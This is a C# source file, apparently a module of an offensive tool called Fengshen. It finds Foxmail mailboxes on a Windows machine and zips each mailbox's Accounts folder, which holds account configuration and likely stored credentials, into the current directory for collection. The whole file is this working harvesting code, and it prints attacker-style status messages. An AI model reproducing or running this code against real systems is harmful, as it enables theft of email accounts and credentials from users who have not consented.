using System;
using System.IO;
using System;
using Microsoft.Win32;
using System.IO;
using System.IO.Compression;

namespace Fengshen.Lib
{
    public static class foxmail
    {
        public static void foundmail(string InstallDirectory)
        {
            string emaildirectory = Path.Combine(Path.GetDirectoryName(InstallDirectory), "Storage");

            if (Directory.Exists(emaildirectory))
            {
                string[] directories = Directory.GetDirectories(emaildirectory);
                if (directories.Length > 0)
                {
                    Console.WriteLine(" [+] found foxmail exist email");
                    foreach (string email in directories)
                    {
                        Console.WriteLine($" [+] found e-mail : {Path.GetFileName(email)}");
                        Zipmail(email);
                    }
                }
                else
                {
                    Console.WriteLine(" [-] no storage! current user's sessions not login email!");
                }
            }
            else
            {
                Console.WriteLine(" [-] current user's sessions not login email!");
            }
        }

        public static void Zipmail(string dir)
        {
            string accountsDirectory =  dir + "\\Accounts";
            if (Directory.Exists(accountsDirectory))
            {
                string currentDirectory = Directory.GetCurrentDirectory();
                string zipFileName = $"{Path.GetFileName(dir)}.zip";
                string zipFilePath = Path.Combine(currentDirectory, zipFileName);
                try
                {
                    ZipFile.CreateFromDirectory(accountsDirectory, zipFilePath);
                    Console.WriteLine($" [+] zip success！saved zip: {zipFilePath}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($" [-] zip error : {ex.Message}");

                }
            }
            else
            {
                Console.WriteLine(" [-] current user's sessions not login email!");
            }
        }
    }
}
